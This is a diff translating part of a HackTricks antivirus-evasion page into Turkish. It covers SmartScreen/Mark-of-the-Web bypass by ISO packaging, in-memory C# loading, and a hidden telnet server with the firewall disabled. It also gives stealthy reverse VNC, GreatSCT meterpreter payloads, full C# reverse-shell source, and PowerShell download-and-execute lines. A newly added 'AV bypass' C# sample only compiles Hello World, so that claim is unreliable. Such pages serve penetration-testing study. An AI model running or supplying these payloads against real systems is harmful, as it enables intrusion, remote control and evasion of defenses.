+* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nim ile yazılmış bir .NET PE Crypter olan Nimcrypt
+* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL'yi kabuk koduna dönüştürebilir ve ardından onları yükleyebilir
 
-## SmartScreen & MoTW
+## SmartScreen ve MoTW
 
-You may have seen this screen when downloading some executables from the internet and executing them.
+İnternetten bazı yürütülebilir dosyaları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.
 
-Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.
+Microsoft Defender SmartScreen, potansiyel olarak kötü amaçlı uygulamaları çalıştırmaktan korumak için tasarlanmış bir güvenlik mekanizmasıdır.
 
 <figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).
+SmartScreen, temel olarak bir itibar tabanlı yaklaşımla çalışır, yani yaygın olarak indirilen uygulamalar SmartScreen'i tetikler ve böylece son kullanıcıya dosyayı çalıştırmadan önce uyarı verir ve engeller (ancak dosya yine de Daha Fazla Bilgi -> Yine de Çalıştır'a tıklayarak çalıştırılabilir).
 
-**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.
+**MoTW** (Mark of The Web), internetten dosya indirildiğinde otomatik olarak oluşturulan ve indirildiği URL ile birlikte Zone.Identifier adında bir [NTFS Alternatif Veri Akışı](https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS))'dır.
 
-<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sini kontrol etme.</p></figcaption></figure>
 
 {% hint style="info" %}
-It's important to note that executables signed with a **trusted** signing certificate **won't trigger SmartScreen**.
+Önemli bir not olarak, **güvenilir** bir imzalama sertifikasıyla imzalanan yürütülebilir dosyaların **SmartScreen'i tetiklemediğini** belirtmek önemlidir.
 {% endhint %}
 
-A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.
+Payload'larınızın Mark of The Web'i almaması için çok etkili bir yol, ISO gibi bir tür konteynerin içine paketlemektir. Bu, Mark-of-the-Web (MOTW)'ün **NTFS olmayan** birimlere uygulanamamasından kaynaklanır.
 
 <figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
-[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.
+[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) Mark-of-the-Web'i atlatmak için payload'ları çıktı konteynerlerine paketleyen bir araçtır.
 
-Example usage:
-
+Örnek kullanım:
 ```powershell
 PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso
 
 +      o     +              o   +      o     +              o
-    +             o     +           +             o     +         +
-    o  +           +        +           o  +           +          o
++             o     +           +             o     +         +
+o  +           +        +           o  +           +          o
 -_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
-   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
-   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
+:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
+for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
 -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
 +      o         o   +       o       +      o         o   +       o
 +      o            +      o    ~   Mariusz Banach / mgeeky    o
 o      ~     +           ~          <mb [at] binary-offensive.com>
-    o           +                         o           +           +
+o           +                         o           +           +
 
 [.] Packaging input file to output .iso (iso)...
 Burning file onto ISO:
-    Adding file: /TotallyLegitApp.exe
+Adding file: /TotallyLegitApp.exe
 
 [+] Generated file written to (size: 3420160): container.iso
 ```
-
-Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
+İşte [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak ISO dosyalarının içine payload'ları yerleştirerek SmartScreen'i atlatma için bir demo.
 
 <figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
 
-## C# Assembly Reflection
+## C# Derlemesi Yansıtma
 
-Loading C# binaries in memory has been known for quite some time and it's still a very great way for running your post-exploitation tools without getting caught by AV.
+C# ikili dosyalarını belleğe yükleme uzun zamandır bilinmektedir ve hala AV tarafından yakalanmadan post-exploitation araçlarını çalıştırmanın harika bir yoludur.
 
-Since the payload will get loaded directly into memory without touching disk, we will only have to worry about patching AMSI for the whole process.
+Payload, disk dokunmadan doğrudan belleğe yükleneceği için, tüm süreç için AMSI'yi yamalamaktan başka bir şey düşünmemiz gerekmeyecek.
 
-Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) already provide the ability to execute C# assemblies directly in memory, but there are different ways of doing so:
+Çoğu C2 çerçevesi (sliver, Covenant, metasploit, CobaltStrike, Havoc, vb.) zaten C# derlemelerini doğrudan bellekte çalıştırma yeteneği sağlar, ancak bunu yapmanın farklı yolları vardır:
 
 * **Fork\&Run**
 
-It involves **spawning a new sacrificial process**, inject your post-exploitation malicious code into that new process, execute your malicious code and when finished, kill the new process. This has both its benefits and its drawbacks. The benefit to the fork and run method is that execution occurs **outside** our Beacon implant process. This means that if something in our post-exploitation action goes wrong or gets caught, there is a **much greater chance** of our **implant surviving.** The drawback is that you have a **greater chance** of getting caught by **Behavioural Detections**.
+Bu, **yeni bir fedakar süreç oluşturarak** post-exploitation kötü amaçlı kodunuzu bu yeni süreçe enjekte etmek, kötü amaçlı kodunuzu çalıştırmak ve işlem bittiğinde yeni süreci sonlandırmak anlamına gelir. Bu yöntemin hem avantajları hem de dezavantajları vardır. Fork ve çalıştır yönteminin avantajı, yürütmenin **Beacon implant sürecimiz dışında** gerçekleşmesidir. Bu, post-exploitation eylemimizde bir şeyler yanlış gider veya yakalanırsa, **implantın hayatta kalma şansının çok daha yüksek** olması anlamına gelir. Dezavantajı, **Davranışsal Algılama** tarafından yakalanma olasılığının daha yüksek olmasıdır.
 
 <figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 * **Inline**
 
-It's about injecting the post-exploitation malicious code **into its own process**. This way, you can avoid having to create a new process and getting it scanned by AV, but the drawback is that if something goes wrong with the execution of your payload, there's a **much greater chance** of **losing your beacon** as it could crash.
+Bu, post-exploitation kötü amaçlı kodu **kendi sürecine enjekte etmek** ile ilgilidir. Bu şekilde, yeni bir süreç oluşturmanızı ve AV tarafından taranmasını önlemenizi sağlayabilirsiniz, ancak payload'unuzun yürütülmesiyle bir şeyler yanlış giderse, **beacon'ınızı kaybetme olasılığının çok daha yüksek** olduğu bir dezavantajı vardır.
 
 <figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
+C# Derlemesi yükleme hakkında daha fazla bilgi edinmek isterseniz, lütfen bu makaleyi kontrol edin: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
 {% endhint %}
 
-You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).
+C# Derlemelerini **PowerShell'den** yükleyebilirsiniz, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosuna](https://www.youtube.com/watch?v=oe11Q-3Akuk) göz atın.
 
-## Using Other Programming Languages
+## Diğer Programlama Dillerini Kullanma
 
-As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.&#x20;
+[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) önerisinde belirtildiği gibi, saldırıya uğramış makineye **Saldırgan Kontrollü SMB paylaşımında yüklenmiş yorumlayıcı ortama** erişim sağlayarak diğer dilleri kullanarak kötü amaçlı kodu çalıştırmak mümkündür.
 
-By allowing access to the Interpreter Binaries and the environment on the SMB share you can **execute arbitrary code in these languages within memory** of the compromised machine.
+Yorumlayıcı İkili dosyalarına ve SMB paylaşımındaki ortama erişime izin vererek, saldırıya uğramış makinenin belleğinde bu dillerde **keyfi kodu çalıştırabilirsiniz**.
 
-The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.
+Repo, Defender'ın hala betikleri taradığını ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatmak için daha fazla esneklik** sağladığını belirtiyor. Bu dillerdeki rastgele obfuskasyon olmayan ters kabuk betiklerinin test edilmesi başarılı olmuştur.
 
-## Advanced Evasion
+## Gelişmiş Kaçınma
 
-Evasion is a very complicated topic, sometimes you have to take into account many different sources of telemetry in just one system, so it's pretty much impossible to stay completely undetected in mature environments.
+Kaçınma çok karmaşık bir konudur, bazen bir sistemde birçok farklı telemetri kaynağını dikkate almanız gerekebilir, bu nedenle olgun ortamlarda tamamen algılanmadan kalmak neredeyse imkansızdır.
 
-Every environment you go against will have their own strengths and weaknesses.
+Karşılaştığınız her ortamın kendi güçlü ve zayıf yönleri olacaktır.
 
-I highly encourage you go watch this talk from [@ATTL4S](https://twitter.com/DaniLJ94), to get a foothold into more Advanced Evasion techniques.
+Daha Gelişmiş Kaçınma tekniklerine daha fazla bilgi edinmek için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi şiddetle tavsiye ederim.
 
 {% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}
 
-his is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.
+Ayrıca [@mariuszbit](https://twitter.com/mariuszbit) tarafından yapılan bu Evasion in Depth konuşması da harika.
 
 {% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}
 
-## **Old Techniques**
+## **Eski Teknikler**
 
-### **Check which parts Defender finds as malicious**
+### **Defender'ın hangi bölümleri kötü amaçlı olarak bulduğunu kontrol edin**
 
-You can use [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) which will **remove parts of the binary** until it **finds out which part Defender** is finding as malicious and split it to you.\
-Another tool doing the **same thing is** [**avred**](https://github.com/dobin/avred) with an open web offering the service in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
-
-### **Telnet Server**
-
-Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
-
+[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) kullanabilirsiniz, bu, binary'nin **kötü amaçlı olarak bulduğu bölümleri kaldıracak** ve onları size ayıracaktır.\
+Aynı şeyi yapan başka bir araç ise [**avred**](https://github.com/dobin/avred) ve hizmeti sunan açık bir web sitesi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
-
-Make it **start** when the system is started and **run** it now:
-
+Sistemin başlatıldığında **başlamasını** ve şimdi **çalışmasını** sağlayın:
 ```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
-
-**Change telnet port** (stealth) and disable firewall:
-
+**Telnet portunu değiştirme** (gizli) ve güvenlik duvarını devre dışı bırakma:
 ```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
 ```
-
 ### UltraVNC
 
-Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)
+İndirme bağlantısı: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (kurulum değil, bin indirmek istersiniz)
 
-**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:
+**SUNUCUDA**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:
 
-* Enable the option _Disable TrayIcon_
-* Set a password in _VNC Password_
-* Set a password in _View-Only Password_
+* _Disable TrayIcon_ seçeneğini etkinleştirin
+* _VNC Password_ alanına bir şifre belirleyin
+* _View-Only Password_ alanına bir şifre belirleyin
 
-Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**
+Ardından, _**winvnc.exe**_ ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **hedefin** içine taşıyın.
 
-#### **Reverse connection**
+#### **Ters bağlantı**
 
-The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+**Saldırgan**, **sunucusunda** `vncviewer.exe -listen 5900` komutunu **çalıştırmalıdır** böylece ters **VNC bağlantısını** almak için **hazır** olur. Ardından, **hedefte**: winvnc daemon'ını başlatın `winvnc.exe -run` ve `winwnc.exe [-autoreconnect] -connect <saldırgan_ip>::5900` komutunu çalıştırın.
 
-**WARNING:** To maintain stealth you must not do a few things
+**UYARI:** Gizliliği korumak için bazı şeyleri yapmamalısınız
 
-* Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
-* Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
-* Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)
+* Eğer `winvnc` zaten çalışıyorsa başlatmayın veya bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. `tasklist | findstr winvnc` komutuyla çalışıp çalışmadığını kontrol edin.
+* Aynı dizinde `UltraVNC.ini` dosyası olmadan `winvnc` başlatmayın veya [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılacaktır.
+* Yardım için `winvnc -h` komutunu çalıştırmayın veya bir [popup](https://i.imgur.com/oc18wcu.png) tetiklersiniz.
 
 ### GreatSCT
 
-Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
-
+İndirme bağlantısı: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
 ```
 git clone https://github.com/GreatSCT/GreatSCT.git
 cd GreatSCT/setup/
@@ -406,9 +376,7 @@ cd GreatSCT/setup/
 cd ..
 ./GreatSCT.py
 ```
-
-Inside GreatSCT:
-
+GreatSCT İçinde:
 ```
 use 1
 list #Listing available payloads
@@ -418,29 +386,23 @@ sel lport 4444
 generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
-
-Now **start the lister** with `msfconsole -r file.rc` and **execute** the **xml payload** with:
-
+Şimdi `msfconsole -r file.rc` komutunu kullanarak **lister'ı başlatın** ve **xml payload**'ı şu şekilde **çalıştırın**:
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
+**Mevcut savunucu işlemi çok hızlı bir şekilde sonlandıracaktır.**
 
-**Current defender will terminate the process very fast.**
+### Kendi ters kabuğumuzu derlemek
 
-### Compiling our own reverse shell
+https://medium.com/@Bank\_Security/algılanamayan-c-c-ters-kabuklar-fab4c0ec4f15
 
-https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
+#### İlk C# Ters Kabuk
 
-#### First C# Revershell
-
-Compile it with:
-
+Şununla derleyin:
 ```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
 ```
-
-Use it with:
-
+Kullanımı:
 ```
 back.exe <ATTACKER_IP> <PORT>
 ```
@@ -459,78 +421,130 @@ using System.Net.Sockets;
 
 namespace ConnectBack
 {
-	public class Program
-	{
-		static StreamWriter streamWriter;
+public class Program
+{
+static StreamWriter streamWriter;
 
-		public static void Main(string[] args)
-		{
-			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
-			{
-				using(Stream stream = client.GetStream())
-				{
-					using(StreamReader rdr = new StreamReader(stream))
-					{
-						streamWriter = new StreamWriter(stream);
-						
-						StringBuilder strInput = new StringBuilder();
+public static void Main(string[] args)
+{
+using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
+{
+using(Stream stream = client.GetStream())
+{
+using(StreamReader rdr = new StreamReader(stream))
+{
+streamWriter = new StreamWriter(stream);
 
-						Process p = new Process();
-						p.StartInfo.FileName = "cmd.exe";
-						p.StartInfo.CreateNoWindow = true;
-						p.StartInfo.UseShellExecute = false;
-						p.StartInfo.RedirectStandardOutput = true;
-						p.StartInfo.RedirectStandardInput = true;
-						p.StartInfo.RedirectStandardError = true;
-						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-						p.Start();
-						p.BeginOutputReadLine();
+StringBuilder strInput = new StringBuilder();
 
-						while(true)
-						{
-							strInput.Append(rdr.ReadLine());
-							//strInput.Append("\n");
-							p.StandardInput.WriteLine(strInput);
-							strInput.Remove(0, strInput.Length);
-						}
-					}
-				}
-			}
-		}
+Process p = new Process();
+p.StartInfo.FileName = "cmd.exe";
+p.StartInfo.CreateNoWindow = true;
+p.StartInfo.UseShellExecute = false;
+p.StartInfo.RedirectStandardOutput = true;
+p.StartInfo.RedirectStandardInput = true;
+p.StartInfo.RedirectStandardError = true;
+p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+p.Start();
+p.BeginOutputReadLine();
 
-		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+while(true)
+{
+strInput.Append(rdr.ReadLine());
+//strInput.Append("\n");
+p.StandardInput.WriteLine(strInput);
+strInput.Remove(0, strInput.Length);
+}
+}
+}
+}
+}
+
+private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+{
+StringBuilder strOutput = new StringBuilder();
+
+if (!String.IsNullOrEmpty(outLine.Data))
+{
+try
+{
+strOutput.Append(outLine.Data);
+streamWriter.WriteLine(strOutput);
+streamWriter.Flush();
+}
+catch (Exception err) { }
+}
+}
+
+}
+}
+```
+### Derleyici kullanarak C# 
+
+Bir AV (Antivirüs) çözümünü atlatmanın bir yolu, C# kodunu derleyici kullanarak çalıştırmaktır. Bu, AV çözümünün statik analizini atlatmanın etkili bir yoludur. İşte bu yöntemi kullanarak nasıl bir AV bypass yapabileceğinizi gösteren bir örnek:
+
+```csharp
+using System;
+using System.CodeDom.Compiler;
+using System.Reflection;
+using Microsoft.CSharp;
+
+namespace AVBypass
+{
+    class Program
+    {
+        static void Main(string[] args)
         {
-            StringBuilder strOutput = new StringBuilder();
+            string code = @"
+                using System;
 
-            if (!String.IsNullOrEmpty(outLine.Data))
-            {
-                try
+                namespace HelloWorld
                 {
-                    strOutput.Append(outLine.Data);
-                    streamWriter.WriteLine(strOutput);
-                    streamWriter.Flush();
+                    class Program
+                    {
+                        static void Main(string[] args)
+                        {
+                            Console.WriteLine(""Hello, World!"");
+                        }
+                    }
                 }
-                catch (Exception err) { }
+            ";
+
+            CSharpCodeProvider provider = new CSharpCodeProvider();
+            CompilerParameters parameters = new CompilerParameters();
+            parameters.GenerateExecutable = true;
+            parameters.OutputAssembly = "Bypass.exe";
+
+            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
+
+            if (results.Errors.HasErrors)
+            {
+                foreach (CompilerError error in results.Errors)
+                {
+                    Console.WriteLine(error.ErrorText);
+                }
+            }
+            else
+            {
+                Assembly assembly = results.CompiledAssembly;
+                Type programType = assembly.GetType("HelloWorld.Program");
+                MethodInfo mainMethod = programType.GetMethod("Main");
+                mainMethod.Invoke(null, null);
             }
         }
-
-	}
+    }
 }
 ```
 
-
-### C# using compiler
-
+Bu örnekte, C# kodu bir dize olarak tanımlanır ve `CSharpCodeProvider` sınıfı kullanılarak derlenir. Derleme sonucunda oluşan derleme sonucu, `Assembly` sınıfı aracılığıyla yürütülür ve `HelloWorld.Program` sınıfının `Main` yöntemi çağrılır. Bu, AV çözümünün dikkatini çekmeden C# kodunu çalıştırmanın bir yoludur.
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
-
 [REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)
 
 [REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)
 
-Automatic download and execution:
-
+Otomatik indirme ve yürütme:
 ```csharp
 64bit:
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
@@ -538,19 +552,16 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 32bit:
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
 ```
-
 {% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}
 
-C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
+C# obfuscators listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
 ### C++
-
 ```
 sudo apt-get install mingw-w64
 
 i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 ```
-
 * [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
 * [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
 * [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
@@ -558,8 +569,7 @@ i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sec
 * [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
 * [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)
 
-### Other tools
-
+### Diğer araçlar
 ```bash
 # Veil Framework:
 https://github.com/Veil-Framework/Veil
@@ -569,36 +579,35 @@ https://www.shellterproject.com/download/
 
 # Sharpshooter
 # https://github.com/mdsecactivebreach/SharpShooter
-# Javascript Payload Stageless: 
+# Javascript Payload Stageless:
 SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
 
-# Stageless HTA Payload: 
+# Stageless HTA Payload:
 SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
 
 # Staged VBS:
 SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
 
-# Donut: 
+# Donut:
 https://github.com/TheWover/donut
 
 # Vulcan
 https://github.com/praetorian-code/vulcan
 ```
-
-### More
+### Daha Fazla
 
 * [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'ı desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
+* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.
 
 </details>
